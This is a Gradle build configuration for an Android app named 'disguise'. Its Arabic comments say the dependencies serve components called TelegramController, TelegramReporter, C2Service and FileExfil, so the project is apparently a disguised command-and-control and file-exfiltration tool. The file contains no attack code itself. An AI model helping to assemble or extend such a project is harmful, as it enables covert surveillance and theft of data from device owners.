plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.example.disguise"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.example.disguise"
        minSdk = 30
        targetSdk = 35
        versionCode = 1
        versionName = "1.0"
    }

    buildFeatures {
        viewBinding = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions {
        jvmTarget = "17"
    }
}

dependencies {
    // ✅ AppCompat (ضروري لـ AppCompatActivity والثيمات)
    implementation("androidx.appcompat:appcompat:1.7.0")

    // ✅ Core KTX (مستخدم في MainActivity: ActivityCompat, ContextCompat)
    implementation("androidx.core:core-ktx:1.13.1")

    // ✅ OkHttp (مستخدم في TelegramController و TelegramReporter)
    implementation("com.squareup.okhttp3:okhttp:4.12.0")

    // ✅ Coroutines (مستخدم في C2Service و FileExfil و غيرها)
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")

    // ✅ JSON (مستخدم في TelegramController و TelegramReporter)
    implementation("org.json:json:20240303")
}
